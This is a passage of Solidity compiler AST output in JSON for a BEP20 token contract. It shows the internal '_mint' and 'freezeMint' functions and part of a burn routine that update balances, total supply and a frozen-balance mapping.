											{
												"expression": {
													"argumentTypes": null,
													"id": 114,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 105,
															"name": "balanceOf",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 23,
															"src": "1657:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 107,
														"indexExpression": {
															"argumentTypes": null,
															"id": 106,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 93,
															"src": "1667:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "1657:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 112,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 95,
																"src": "1691:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 108,
																	"name": "balanceOf",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 23,
																	"src": "1673:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 110,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 109,
																	"name": "to",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 93,
																	"src": "1683:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "1673:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 111,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2335,
															"src": "1673:17:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 113,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1673:24:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1657:40:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 115,
												"nodeType": "ExpressionStatement",
												"src": "1657:40:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 118,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "1729:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 117,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1721:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 119,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1721:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 120,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 93,
															"src": "1733:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 121,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 95,
															"src": "1737:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 116,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															58
														],
														"referencedDeclaration": 58,
														"src": "1712:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 122,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1712:31:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 123,
												"nodeType": "EmitStatement",
												"src": "1707:36:0"
											}
										]
									},
									"documentation": null,
									"id": 125,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_mint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 96,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 93,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 125,
												"src": "1565:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 92,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1565:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 95,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 125,
												"src": "1577:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 94,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1577:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1564:27:0"
									},
									"returnParameters": {
										"id": 97,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1601:0:0"
									},
									"scope": 435,
									"src": "1550:200:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 171,
										"nodeType": "Block",
										"src": "1855:377:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 139,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 135,
																"name": "account",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 127,
																"src": "1911:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 137,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1930:1:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		}
																	],
																	"id": 136,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "1922:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 138,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1922:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "1911:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "42455032303a206d696e7420746f20746865207a65726f2061646472657373",
															"id": 140,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1934:33:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9865f573770ea57d1686e7914cb6526cbb139a36ffdd4bab8d4db350bbc932b3",
																"typeString": "literal_string \"BEP20: mint to the zero address\""
															},
															"value": "BEP20: mint to the zero address"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_9865f573770ea57d1686e7914cb6526cbb139a36ffdd4bab8d4db350bbc932b3",
																"typeString": "literal_string \"BEP20: mint to the zero address\""
															}
														],
														"id": 134,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2446,
															2447
														],
														"referencedDeclaration": 2447,
														"src": "1903:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 141,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1903:65:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 142,
												"nodeType": "ExpressionStatement",
												"src": "1903:65:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 148,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 143,
														"name": "totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 19,
														"src": "2044:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 146,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 129,
																"src": "2074:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 144,
																"name": "totalSupply",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 19,
																"src": "2058:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 145,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2335,
															"src": "2058:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 147,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2058:23:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2044:37:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 149,
												"nodeType": "ExpressionStatement",
												"src": "2044:37:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 159,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 150,
															"name": "_frozenBalance",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 33,
															"src": "2091:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 152,
														"indexExpression": {
															"argumentTypes": null,
															"id": 151,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 127,
															"src": "2106:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2091:23:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 157,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 129,
																"src": "2145:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 153,
																	"name": "_frozenBalance",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 33,
																	"src": "2117:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 155,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 154,
																	"name": "account",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 127,
																	"src": "2132:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "2117:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 156,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2335,
															"src": "2117:27:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 158,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2117:35:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2091:61:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 160,
												"nodeType": "ExpressionStatement",
												"src": "2091:61:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 163,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2184:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 162,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "2176:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 164,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2176:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 165,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 127,
															"src": "2188:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 166,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 129,
															"src": "2197:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 161,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															58
														],
														"referencedDeclaration": 58,
														"src": "2167:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 167,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2167:37:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 168,
												"nodeType": "EmitStatement",
												"src": "2162:42:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 169,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2221:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 133,
												"id": 170,
												"nodeType": "Return",
												"src": "2214:11:0"
											}
										]
									},
									"documentation": null,
									"id": 172,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "freezeMint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 130,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 127,
												"name": "account",
												"nodeType": "VariableDeclaration",
												"scope": 172,
												"src": "1785:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 126,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1785:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 129,
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 172,
												"src": "1810:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 128,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1810:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1775:55:0"
									},
									"returnParameters": {
										"id": 133,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 132,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 172,
												"src": "1849:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 131,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1849:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1848:6:0"
									},
									"scope": 435,
									"src": "1756:476:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 205,
										"nodeType": "Block",
										"src": "2291:155:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 188,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 179,
															"name": "balanceOf",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 23,
															"src": "2301:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 181,
														"indexExpression": {
															"argumentTypes": null,
															"id": 180,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 174,
															"src": "2311:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2301:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 186,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 176,
																"src": "2339:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 182,
																	"name": "balanceOf",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 23,
																	"src": "2319:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 184,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 183,
																	"name": "from",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 174,
																	"src": "2329:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "2319:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 185,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sub",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2357,
															"src": "2319:19:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 187,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2319:26:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2301:44:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 189,
												"nodeType": "ExpressionStatement",
												"src": "2301:44:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 195,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 190,
														"name": "totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 19,
														"src": "2355:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 193,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 176,
																"src": "2385:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 191,
																"name": "totalSupply",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 19,
																"src": "2369:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 192,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sub",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2357,
															"src": "2369:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 194,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2369:22:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2355:36:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 196,
												"nodeType": "ExpressionStatement",
												"src": "2355:36:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 198,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 174,
															"src": "2415:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 200,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2429:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 199,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "2421:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 201,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2421:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 202,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 176,
															"src": "2433:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
